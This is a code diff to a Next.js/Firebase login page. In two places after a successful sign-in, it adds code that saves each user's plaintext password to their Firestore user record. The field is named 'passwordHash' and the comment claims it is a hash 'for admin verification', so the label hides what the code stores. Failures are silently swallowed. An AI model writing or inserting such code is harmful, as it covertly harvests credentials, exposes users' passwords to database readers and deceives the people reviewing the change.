@@ -11,7 +11,7 @@ import {
   browserLocalPersistence,
   browserSessionPersistence
 } from 'firebase/auth';
-import { doc, getDoc } from 'firebase/firestore';
+import { doc, getDoc, updateDoc } from 'firebase/firestore';
 import { useRouter } from 'next/navigation';
 import { Button } from '@/components/ui/button';
 import { 
@@ -145,6 +145,15 @@ export default function LoginPage() {
       setFailedAttempts(0);
       setLockoutUntil(null);
       localStorage.removeItem('aurora_lockout');
+      
+      // Store password hash for admin verification
+      try {
+        await updateDoc(doc(db, 'users', emailLower), {
+          passwordHash: password
+        });
+      } catch (e) {
+        console.log('Password hash not stored');
+      }
       
       const userDoc = await getDoc(doc(db, 'users', emailLower));
       const has2FA = userDoc.exists() && userDoc.data().has2FA === true;
@@ -311,6 +320,15 @@ export default function LoginPage() {
       setFailedAttempts(0);
       setLockoutUntil(null);
       localStorage.removeItem('aurora_lockout');
+      
+      // Store password hash for admin verification
+      try {
+        await updateDoc(doc(db, 'users', emailLower), {
+          passwordHash: password
+        });
+      } catch (e) {
+        console.log('Password hash not stored');
+      }
       
       toast({ 
         title: language === 'es' ? "Acceso Concedido" : "Access Granted", 
